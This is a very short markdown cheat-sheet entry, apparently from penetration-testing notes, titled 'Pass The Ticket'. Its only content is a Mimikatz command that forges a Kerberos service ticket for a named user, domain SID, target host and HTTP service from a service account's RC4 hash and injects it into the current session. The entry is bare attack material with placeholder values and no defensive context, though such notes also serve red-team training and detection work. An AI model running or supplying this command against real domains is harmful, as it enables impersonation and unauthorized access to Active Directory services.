# Pass The Ticket

#### Mimikatz

{% code overflow="wrap" %}
```
kerberos::golden /user:compromised_user /domain:domain.com /sid:domain-sid /target:web.domain.com /service:http /rc4:service_hash /ptt
```
{% endcode %}
